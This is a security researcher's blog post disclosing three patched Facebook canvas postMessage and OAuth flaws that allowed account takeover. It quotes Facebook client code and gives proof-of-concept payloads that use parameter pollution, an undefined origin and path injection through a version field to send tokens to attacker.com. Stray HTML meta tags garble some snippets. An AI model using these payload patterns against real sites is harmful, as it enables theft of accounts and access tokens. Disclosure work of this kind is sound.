---
id: 708
title: 'More secure Facebook Canvas : Tale of $126k worth of bugs that lead to Facebook Account Takeovers'
date: '2021-09-03T03:22:42+00:00'
author: qw
layout: post
guid: 'https://ysamm.com/?p=708'
wp_featherlight_disable:
    - ''
categories:
    - Uncategorized
---

**Summery**

Facebook allowed online games owners to host their games/applications in apps.facebook.com for many years now. The idea and technology behind it was that the game ( Flash or HTML5 based) would be hosted in the owner website and later the website page hosting it should be shown to the Facebook user in apps.facebook.com inside a controlled iframe. Since the game is not hosted in Facebook and for best user experience like keeping score and profile data, Facebook had to establish a communication channel with the game owner to verify the identity of the Facebook user for example. This was ensured by using cross windows communication/messaging between apps.facebook.com and the game website inside the iframe. In this blog post, i’ll be discussing multiple vulnerabilities i found in this implementation.

**Vulnerabilities potential**

These bugs were found after careful auditing of the client-side code inside apps.facebook.com responsible of verifying what’s coming through this channel. The bugs explained below (and others) allowed me to takeover any Facebook account if the user decided to visit my game page inside apps.facebook.com. The severity of these bugs is high since these were present for years and billions of user and their information could have been compromised easily since this was served from inside Facebook. Facebook confirmed they didn’t see any indicators of previous abuse or exploitation of these bugs.

**For Researchers**

Before explaining the actual bugs below, i tried to show the way i decomposed the code and a simplified path to track the flow of the message data and how its components will be used. I probably didn’t left much to dig but i hope the information shared could help you in your research. If you are only interested in the bugs themselves then jump to each bug section part.

**Description**

So far we know that the game page being served inside an iframe in apps.facebook.com is communicating with the parent window to ask Facebook to do some actions. Among the requested actions , for example , is to show a dialog to the user that would allow him to confirm the usage of the Facebook application owned by the game developers which would help me to identify you and get some information from an access token that they’ll receive if the user decided to user the application. The script responsible of receiving the cross window messages, interpreting them and understanding the action demanded is below ( only necessary parts are shown and as they were before the bugs were fixed ) :

```javascript
__d("XdArbiter", ...
            handleMessage: function(a, b, e) {
                d("Log").debug("XdArbiter at " + (window.name != null && window.name !== "" ? window.name : window == top ? "top" : "[no name]") + " handleMessage " + JSON.stringify(a));
                if (typeof a === "string" && /^FB_RPC:/.test(a)) {
                    k.enqueue([a.substring(7), {
                        origin: b,
                        source: e || i[h]
                    }]);
           ...
            send: function(a, b, e) {
                var f = e in i ? e : h;
                a = typeof a === "string" ? a : c("QueryString").encode(a);
                b = b;
                try {
                    d("SecurePostMessage").sendMessageToSpecificOrigin(b, a, e)
                } catch (a) {
                    d("Log").error("XdArbiter: Proxy for %s not available, page might have been navigated: %s", f, a.message), delete i[f]
                }
                return !0
            }
...

    window.addEventListener("message", function(a) {
        if (a.data.xdArbiterSyn) d("SecurePostMessage").sendMessageAllowAnyOrigin_UNSAFE(a.source, {
            xdArbiterAck: !0
        });
        else if (a.data.xdArbiterRegister) {
            var b = l.register(a.source, a.data.xdProxyName, a.data.origin, a.origin);
            d("SecurePostMessage").sendMessageAllowAnyOrigin_UNSAFE(a.source, {
                xdArbiterRegisterAck: b
            })
        } else a.data.xdArbiterHandleMessage && l.handleMessage(a.data.message, a.data.origin, a.source)
}), 98);

__d("JSONRPC", ...
        c.read = function(a, c) {
            ...
            e = this.local[a.method];
            try {
                e = e.apply(c || null, a.params);
                typeof e !== "undefined" && g("result", e)
            ...
    e.exports = a
}), null);

__d("PlatformAppController", ...
function f(a, b, e) { ...
         c("PlatformDialogClient").async(f, a, function(d) { ... b(d) });
}...
t.local.showDialog = f;

...

t = new(c("JSONRPC"))(function(a, b) {
            var d = b.origin || k;
            b = b.source;
            if (b == null) {
                var e = c("ge")(j);
                b = e.contentWindow
            }
            c("XdArbiter").send("FB_RPC:" + a, b, d)
        }
...

<meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>}), null);

__d("PlatformDialogClient", ...
function async(a, b, e) {
        var f = c("guid")(),
            g = b.state;
        b.state = f;
        b.redirect_uri = new(c("URI"))("/dialog/return/arbiter").setSubdomain("www").setFragment(c("QueryString").encode({
            origin: b.redirect_uri
        })).getQualifiedURI().toString();
        b.display = "async";
        j[f] = {
            callback: e || function() {},
            state: g
        };
        e = "POST";
        d("AsyncDialog").send(new(c("AsyncRequest"))(this.getURI(a, b)).setMethod(e).setReadOnly(!0).setAbortHandler(k(f)).setErrorHandler(l(f)))
    }
...
function <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>getURI(a, b) {
        if (b.version) {
            var d = new(c("URI"))("/" + b.version + "/dialog/" + a);
            delete b.version;
            return d.addQueryData(b)
        }
        return c("PlatformVersioning").versionAwareURI(new(c("URI"))("/dialog/" + a).addQueryData(b))
    }

}), 98);


```

To simplify the code for you to understand the flow in case someone decides to dig more into it and looks for more bugs :

Iframe sends message to parent **=&gt;** Message event dispatched in <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>XdArbiter **=&gt;** Message handler function passes data to handleMessage function **=&gt;** “enqueue” function passes to <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>JSONRPC =&gt; <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>JSONRPC.read calls this.local.<meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>showDialog function in <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>PlatformAppController **=&gt;** function checks message and if all valid, call <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>PlatformDialogClient **=&gt;** <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>PlatformDialogClient.async sends a POST request to **apps.facebook.com/dialog/oauth** , returned access_token would be passed to <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>XdArbiter.send function ( few steps were skipped ) **=&gt;** <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta> <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>XdArbiter.send would send a cross window message to the iframe window **=&gt;** Event dispatched in iframe window containing Facebook user access_token

Below an example of a simple code to construct the message to be sent to apps.facebook.com from the iframe, a similar one would be send from any game page using the Facebook Javascript SDK but with more unnecessary parts:

```javascript
 msg = JSON.stringify({"jsonrpc":"2.0",
                                    "method":"showDialog",
                                    "id":1,
                                    "params":[{"method":"permissions.oauth","display":"async","redirect_uri":"https://ysamm.com/callback","app_id":"APP_ID","client_id":"<meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>APP_ID","response_type":"token"}]})
                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + msg , origin: IFRAME_ORIGIN}
window.parent.postMessage(fullmsg,"*");
```

Interested parts to manipulate are :   
– **IFRAME_ORIGIN**, which is the one to be used in the redirect_uri parameter send with the POST request to apps.facebook.com/dialog/oauth to be verified server-side that it’s a domain owned by the application requesting an access_token, then would be used as targetOrigin in postMessage to send a cross window message to the iframe with the access_token  
– Keys and values of the object inside **params** , there are the parameters to be appended to <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>apps.facebook.com/dialog/oauth. Most interesting ones are redirect_uri ( which can replace <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>**IFRAME_ORIGIN** in the POST request in some cases ) and <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>**APP_ID**

**Attacks vectors/scenarios**

What we’ll do here is to try to instead of requesting an access token for the game application we own, we’ll try to get one of a Facebook first party application like Instagram. What’s holding us back is although we control the <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>IFRAME_ORIGIN and <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>APP_ID which we can set to match the Instagram application as www.instagram.com and 124024574287414, later the message sent to the iframe containing the first party access token would have a targetOrigin in postMessage as www.instagram.com which is not our window origin. Facebook did a good job protecting against these attacks ( i’ll argue though to why not using the origin from the event message received and matching app_id to the hosted game instead of giving us total freedom which could have prevented all these bugs ), but apparently they left some weaknesses that could have been exploited for many years.

**Bug 1: Parameter Pollution, it was checked server-side and we **definitely** should trust it**

This bug occurs due to the fact that the POST request to **https://apps.facebook.com/dialog/oauth** when constructed from the received message from the iframe, could contain user controlled parameters.   
All parameters are checked in the client-side ( PlatformAppController, showDialog method and ,PlatformDialogClient.async method) and duplicate parameters will be removed in PlatformAppController , also AsyncRequest module seems to be doing some filtering ( removing parameters that already exist but brackets were appended to it ).   
  
However due to some missing checking in the server-side, a parameter name set to **PARAM\[random** would replace a previously set parameter **PARAM** ; for example **redirect_uri\[0** parameter value would replace **redirect_uri**. We can abuse this as follow :   
1\) Set **APP_ID** to be the Instagram application id.   
2\) The redirect_uri will be constructed in PlatformDialogClient.async (Line 72 ) using <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>**IFRAME_ORIGIN** ( will end up **https://www.facebook.com/dialog/return/arbiter#origin=https://attacker.com** ) , which would be sent matching our iframe window origin but won’t be used at all as explained below.   
3\) Set **redirect_uri\[0** in **params** as an additional parameter ( order matters so it must be after **redirect_uri** ) to be **https://www.instagram.com/accounts/signup**/ which is a valid redirect_uri for the Instagram applicaiton.  
The URL of the POST request end up being something like this:

```javascript
https://apps.facebook.com/dialog/oauth?state=f36be3f648ddfb&display=async&redirect_uri=https://www.facebook.com/dialog/return/arbiter#origin=https://attacker.com&app_id=124024574287414&client_id=124024574287414&response_type=token&redirect_uri[0=https://www.instagram.com/accounts/signup/
```

The request would end up being successful and returning a first party access token since <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>redirect_uri\[0 replaces redirect_uri and it’s a valid redirect_uri. In the client side though, the logic is if an access_token was received it means that the origin used to construct the redirect_uri did work with the app_id and for that it should trust it and use to send the message to the iframe, behind the scenes though redirect_uri\[0 was used and not redirect_uri ( Cool right?)  
  
**Proof of concept**

```javascript
<meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>xmsg = JSON.stringify({"jsonrpc":"2.0",
                                    "method":"showDialog",
                                    "id":1,
                                    "params":[{"method":"permissions.oauth","display":"async","redirect_uri":"https://attacker.com/callback","app_id":"124024574287414","client_id":"<meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>124024574287414","response_type":"token","redirect_uri[0":"https://www.instagram.com/accounts/signup/"}]})
                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + xmsg , origin: "https://attacker.com"}
window.parent.postMessage(fullmsg,"*");
```

**Bug 2: Why bothering, Origin is undefined**

The main problem for this one is that /dialog/oauth endpoint would accept **https://www.facebook.com/dialog/return/arbiter** as a valid redirect_uri ( without a valid origin in the fragment part ) for third-party applications and some first-party ones.  
The second problem is that this behaviour to occur ( no origin in the fragment part ), the message sent from the iframe to **apps.facebook.com** should not contain a.data.origin ( <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>**IFRAME_ORIGIN** is undefined ) , however this same value would be used later to send a cross window message to the iframe, if **null** or **undefined** is used, the message won’t be received.   
Likely, i noticed that **JSONRPC** function would always receive a not null origin of the postMessage ( Line 55 ) . Since b.origin is undefined or null, **k** would be chosen. **k** could be set by the attacker by first registering a valid origin via **c(“Arbiter”).subscribe(“XdArbiter/register”)** which could be informed if our message had **xdArbiterRegister** and a specified origin . Before “**k**” variable is set, the supplied origin would be checked first if it belongs to the attacker application using “**/platform/app_owned_url_check/**” endpoint.  
This is wrong and the second problem occurs here since we can’t ensure that the user in the next cross origin message sent from the iframe would supply the same **APP_ID**.

Not all first-party applications are vulnerable to this though. I used the Facebook Watch for Android application or Portal to get a first party access_token.

The URL of the POST request would be something like this:

```javascript
<meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>https://apps.facebook.com/dialog/oauth?state=f36be3f648ddfb&display=async&redirect_uri=<meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>https://www.facebook.com/dialog/return/arbiter&app_id=<meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>1348564698517390&client_id=<meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>1348564698517390&response_type=token
```

**Proof Of Concept**

```javascript
window.parent.postMessage({xdArbiterRegister:true,origin:"https://attacker.com"},"*")

<meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>xmsg = JSON.stringify({"jsonrpc":"2.0",
                                    "method":"showDialog",
                                    "id":1,
                                    "params":[{"method":"permissions.oauth","display":"async","app_id":"1348564698517390","client_id":"<meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>1348564698517390","response_type":"token"}]})
                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + xmsg}
window.parent.postMessage(fullmsg,"*");
```

**Bug 3**: **Total** **Chaos**, **version can’t be harmful**

This bug one occurs in **PlatformDialogClient.getURI** function which is responsible of setting the API version before /dialog/oauth endpoint. This function didn’t check for double dots or added paths and directly constructed a URI object to be used later to send an XHR request ( Line 86 ).  
The **version** property in **params** passed in the cross window message sent to **apps.facebook.com** could be set to **api/graphql/?doc_id=DOC_ID&amp;variables=VAR#** and would eventually lead to a POST request sent to the GraphQL endpoint with valid user CSRF token.

**DOC_ID** and **VAR** could be set to an id of a GraphQL Mutation to add a phone number to the attacount, and the variables of this mutation.

The URL of the POST request would be something like this:

```javascript
https://apps.facebook.com/api/graphql?doc_id=DOC_ID&variables=VAR&?/dialog/oauth&state=f36be3f648ddfb&display=async&redirect_uri=https://www.facebook.com/dialog/return/arbiter#origin=attacker&app_id=1348564698517390&client_id=1348564698517390&response_type=token
```

**Proof Of Concept**

```javascript
<meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>xmsg = JSON.stringify({"jsonrpc":"2.0",
                                    "method":"showDialog",
                                    "id":1,
                                    "params":[{"method":"permissions.oauth","display":"async","client_id":"<meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>APP_ID","response_type":"token","version":"<meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>api/graphql?doc_id=DOC_ID&variables=VAR&"}]})
                fullmsg = {xdArbiterHandleMessage:true,message:"FB_RPC:" + xmsg , origin: "https://attacker.com"}
window.parent.postMessage(fullmsg,"*");
```

**Timeline**

1. Aug 4, 2021— Report Sent   
    <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>Aug 4, 2021— Acknowledged by Facebook  
    <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>Aug 6, 2021— Fixed by Facebook  
    Sep 2, 2021 — $42000 bounty awarded by Facebook.
2. Aug 9, 2021— Report Sent   
    <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>Aug 9, 2021— Acknowledged by Facebook  
    <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>Aug 12, 2021— Fixed by Facebook  
    Aug 31, 2021 — $42000 bounty awarded by Facebook.
3. Aug 12, 2021— Report Sent   
    <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>Aug 13, 2021— Acknowledged by Facebook  
    <meta content="text/html; charset=utf-8" http-equiv="content-type"></meta>Aug 17, 2021— Fixed by Facebook  
    Sep 2, 2021 — $42000 bounty awarded by Facebook.